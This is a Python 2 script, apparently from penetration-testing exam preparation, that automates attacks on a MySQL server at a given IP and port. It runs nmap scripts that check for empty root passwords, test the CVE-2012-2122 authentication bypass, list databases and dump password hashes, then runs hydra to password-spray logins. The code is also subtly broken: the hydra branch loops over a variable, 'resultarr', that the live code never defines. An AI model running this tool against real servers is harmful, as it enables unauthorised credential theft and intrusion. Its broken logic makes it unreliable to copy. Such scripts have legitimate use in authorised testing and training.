#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) != 3:
    print "Usage: mysqlrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

#NSE Documentation
#Running
#mysql-databases: attempts to list databases. args mysqluser,mysqlpass. will use empty password if none provided/brute/etc
#mysql-dump-hashes: dumps hashes for John. requires root. args username,password
#mysql-empty-password: checks for Mysql servers with an empty password for 'root' or 'anonymous'
#mysql-enum: performs user enum using a bug. 5.x are susceptible when using old auth mechanism. seclists.org/fulldisclosure/2012/Dec/9
#mysql-info: connects and prints proto, version, thread, status, capabilities, password salt, etc
#mysql-variables: attempt to show variables on a server. requires auth. will use empty password if non provided.
#mysql-vuln-cve2012-2122: auth bypass in versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22.

#Not Running
#mysql-audit: audit security config against parts of CIS MySQL 1.0.2 benchmark --script-args mysql-audit.username,password,filename
#mysql-brute: brute guess against mySQL, seems beneficial to let nmap brute instead of hydra for additional nmap scripts args 'userdb''passdb'
#mysql-query: runs a query and returns the table args 'query''username''password'
print "INFO: Performing nmap MySQL script scan for %s:%s" % (ip_address, port)
#MySQLSCAN = "nmap -n -sV -Pn -vv -p %s --script mysql-empty-password,mysql-vuln-cve2012-2122,mysql-databases,mysql-dump-hashes,mysql-enum,mysql-info,mysql-variables,vulners -oA '/root/scripts/recon_enum/results/exam/mysql/%s_mysql' %s" % (port, ip_address, ip_address)
#results = subprocess.check_output(MySQLSCAN, shell=True)
subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=mysql-empty-password,mysql-vuln-cve2012-2122,mysql-databases,mysql-dump-hashes,mysql-enum,mysql-info,mysql-variables,vulners','-oA','/root/scripts/recon_enum/results/exam/mysql/%s_%s_mysql' % (ip_address,port),ip_address])

#Hydra meant to do weak brute/spray, not extensive
#run manually for extensive brute
print "INFO: Performing hydra mysql scan against %s" % (ip_address)
#HYDRA = "hydra -L /root/lists/userlist_sqlbrute.txt -P /root/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/mysql/%s_mysqlhydra.txt -u %s -s %s mysql" % (ip_address, ip_address, port)
try:
    #results = subprocess.check_output(HYDRA, shell=True)
    #resultarr = results.split("\n")
    results = subprocess.check_output(['hydra','-L','/root/lists/userlist_sqlbrute.txt','-P','/root/lists/quick_password_spray.txt','-f','-o','/root/scripts/recon_enum/results/exam/mysql/%s_%s_mysqlhydra.txt' % (ip_address,port),'-u',ip_address,'-s',port,'mysql']).split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid mysql credentials found: %s" % (result)
except subprocess.CalledProcessError as hydrerr:
    if hydrerr.returncode == 255:
        print "Hydra broke early with status 255, it must have found something! Check mysqlhydra for output."
    elif hydrerr.returncode != 0:
        print "Hydra broke:"
        print hydrerr.returncode
        print hydrerr.output
    else:
        print "INFO: No valid mysql credentials found"

# outfile = "/root/scripts/recon_enum/results/exam/mysql/%s_mysqlrecon.txt" % (ip_address)
# f = open(outfile, "w")
# f.write(results)
# f.close
